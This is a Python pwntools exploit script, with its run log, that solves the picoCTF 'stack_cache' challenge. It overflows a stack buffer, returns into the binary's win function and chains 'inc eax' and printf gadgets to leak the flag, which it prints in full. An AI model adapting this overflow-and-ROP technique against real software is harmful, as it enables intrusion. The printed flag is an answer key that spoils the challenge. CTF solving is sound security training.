#!/usr/bin/env python3

'''
$ ./stack_cache.py remote
[*] './stack_cache.bin'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to saturn.picoctf.net on port 61841: Done
[+] Receiving all data: Done (28B)
[*] Closed connection to saturn.picoctf.net port 61841
Recovered: pico...
[+] Opening connection to saturn.picoctf.net on port 61841: Done
[+] Receiving all data: Done (56B)
[*] Closed connection to saturn.picoctf.net port 61841
Recovered: picoCTF{Cle4N_uP_M3m...
[+] Opening connection to saturn.picoctf.net on port 61841: Done
[+] Receiving all data: Done (117B)
[*] Closed connection to saturn.picoctf.net port 61841
Recovered: picoCTF{Cle4N_uP_M3m0rY_5cc29119}...
Flag: picoCTF{Cle4N_uP_M3m0rY_5cc29119}
'''

from sys import argv
from pwn import *

BIN = './stack_cache.bin'

IP = 'saturn.picoctf.net'
PORT = 61841

elf = ELF(BIN)


def open_instance():
    if 'remote' in argv:
        return remote(IP, PORT)
    return process(BIN)


# gadget
inc_eax = p32(0x08088e0e)
call_printf = p32(0x8049ecc)

win_addr = p32(elf.symbols['win'])


def leak_eax(offset: int) -> bytes:
    # generate payload
    padding = b'A' * (10 + 4)
    payload = padding

    payload += win_addr

    # after win is called, the address of flag is stored in eax
    payload += inc_eax * offset
    payload += call_printf

    # send payload
    assert(b'\x00' not in payload)
    p = open_instance()
    p.readuntil(b'Give me a string that gets you the flag')
    p.sendline(payload)

    memory = p.recvall(timeout=5).strip()
    leak = memory[len(payload) + 1:]
    return leak


# leak flag
flag = b''
while b'}' not in flag:
    flag += leak_eax(len(flag))
    print(f"Recovered: {flag.decode()}...")
print(f"Flag: {flag.decode()}")
